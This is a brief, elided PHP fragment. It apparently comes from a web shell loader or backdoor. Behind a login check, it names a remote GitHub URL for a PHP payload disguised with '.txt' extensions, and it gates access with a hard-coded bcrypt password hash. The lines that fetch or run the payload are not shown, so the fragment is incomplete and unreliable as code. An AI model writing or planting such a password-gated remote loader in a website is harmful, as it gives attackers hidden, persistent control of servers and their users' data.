...
if (is_logged_in()) {
    ...
    $destiny = 'https://github.com/mrwawanj/MbahGadget/raw/refs/heads/main/inammo.txt.php.txt';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$Y.omr57u.aboa8gWAiQRI.w4kSNYYeQKI.4J4GgezeCiUq1PZPLiq'; // https://bcrypt.online/
